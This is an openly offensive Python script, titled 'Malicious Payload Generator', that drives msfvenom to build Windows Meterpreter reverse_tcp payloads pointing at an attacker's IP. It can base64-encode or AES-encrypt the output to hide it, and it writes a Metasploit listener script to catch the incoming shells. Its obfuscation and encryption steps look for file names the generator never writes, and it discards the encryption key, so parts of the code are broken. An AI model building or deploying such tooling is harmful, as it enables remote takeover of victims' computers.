import os
import base64
import argparse
import logging
import shutil
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# Configure logging
logging.basicConfig(filename="payload_generator.log", level=logging.INFO, format="%(asctime)s - %(message)s")

def check_dependencies():
    if not shutil.which("msfvenom"):
        print("Error: msfvenom is not installed. Install Metasploit and try again.")
        exit(1)

def generate_payload(ip, port, output_file, payload_type="windows/meterpreter/reverse_tcp", format="exe"):
    """
    Generates a malicious payload using msfvenom.
    Args:
        ip (str): Attacker's IP address.
        port (str): Listening port for the reverse shell.
        output_file (str): Name of the generated payload file.
        payload_type (str): Type of payload (default is windows/meterpreter/reverse_tcp).
        format (str): Format of the payload (default is exe).
    """
    print(f"Generating {payload_type} payload in {format} format...")
    try:
        # Run msfvenom to generate the payload
        command = (
            f"msfvenom -p {payload_type} LHOST={ip} LPORT={port} -f {format} -o {output_file}"
        )
        os.system(command)
        print(f"Payload generated: {output_file}")
        log_generation(ip, port, payload_type, output_file)
    except Exception as e:
        print(f"Error generating payload: {e}")

def obfuscate_payload(input_file, output_file):
    """
    Encodes the payload using Base64 for simple obfuscation.
    Args:
        input_file (str): Path to the payload file to be obfuscated.
        output_file (str): Path to save the obfuscated payload.
    """
    print(f"Obfuscating payload: {input_file}...")
    try:
        with open(input_file, "rb") as f:
            payload = f.read()
        encoded_payload = base64.b64encode(payload).decode("utf-8")
        with open(output_file, "w") as f:
            f.write(encoded_payload)
        print(f"Obfuscated payload saved to: {output_file}")
    except Exception as e:
        print(f"Error obfuscating payload: {e}")

def encrypt_payload(input_file, output_file, key):
    """
    Encrypts the payload using AES encryption.
    Args:
        input_file (str): Path to the payload file to be encrypted.
        output_file (str): Path to save the encrypted payload.
        key (bytes): Encryption key.
    """
    print(f"Encrypting payload: {input_file}...")
    try:
        with open(input_file, "rb") as f:
            payload = f.read()
        
        cipher = AES.new(key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(payload)
        
        with open(output_file, "wb") as f:
            f.write(cipher.nonce + tag + ciphertext)
        print(f"Encrypted payload saved to: {output_file}")
    except Exception as e:
        print(f"Error encrypting payload: {e}")

def setup_listener(ip, port, payload_type):
    """
    Sets up a Metasploit multi-handler for the generated payload.
    Args:
        ip (str): Attacker's IP address.
        port (str): Listening port for the reverse shell.
        payload_type (str): Type of payload.
    """
    listener_script = f"""
use exploit/multi/handler
set payload {payload_type}
set LHOST {ip}
set LPORT {port}
exploit -j
"""
    with open("listener.rc", "w") as f:
        f.write(listener_script)
    print("Metasploit listener script created: listener.rc")
    print("Run with: msfconsole -r listener.rc")

def log_generation(ip, port, payload_type, output_file):
    logging.info(f"Generated payload: {output_file} | Type: {payload_type} | LHOST: {ip} | LPORT: {port}")

def generate_multiple_payloads(ip, port, base_name, payload_types, formats):
    """
    Generates multiple payloads for different formats and types.
    Args:
        ip (str): Attacker's IP address.
        port (str): Listening port for the reverse shell.
        base_name (str): Base name for the generated payload files.
        payload_types (list): List of payload types.
        formats (list): List of formats.
    """
    for payload_type in payload_types:
        for fmt in formats:
            output_file = f"{base_name}_{payload_type.split('/')[-1]}.{fmt}"
            generate_payload(ip, port, output_file, payload_type, fmt)

def main():
    check_dependencies()

    parser = argparse.ArgumentParser(description="Malicious Payload Generator")
    parser.add_argument("ip", help="Attacker's IP address (LHOST)")
    parser.add_argument("port", help="Listening port for the reverse shell (LPORT)")
    parser.add_argument("output_file", help="Base name of the generated payload files")
    parser.add_argument("--payload_types", nargs="+", default=["windows/meterpreter/reverse_tcp"], help="Types of payloads (default: windows/meterpreter/reverse_tcp)")
    parser.add_argument("--formats", nargs="+", default=["exe"], help="Formats of the payloads (e.g., exe, ps1, bat)")
    parser.add_argument("--obfuscate", action="store_true", help="Obfuscate the payload using Base64 encoding")
    parser.add_argument("--encrypt", action="store_true", help="Encrypt the payload using AES")
    parser.add_argument("--listener", action="store_true", help="Create a Metasploit listener script")

    args = parser.parse_args()

    # Generate multiple payloads
    generate_multiple_payloads(args.ip, args.port, args.output_file, args.payload_types, args.formats)
    
    # Obfuscate payload (optional)
    if args.obfuscate:
        for fmt in args.formats:
            obfuscated_file = f"obfuscated_{args.output_file}.{fmt}"
            obfuscate_payload(f"{args.output_file}.{fmt}", obfuscated_file)

    # Encrypt payload (optional)
    if args.encrypt:
        key = get_random_bytes(16)  # 128-bit key
        for fmt in args.formats:
            encrypted_file = f"encrypted_{args.output_file}.{fmt}"
            encrypt_payload(f"{args.output_file}.{fmt}", encrypted_file, key)

    # Setup listener (optional)
    if args.listener:
        setup_listener(args.ip, args.port, args.payload_types[0])

if __name__ == "__main__":
    main()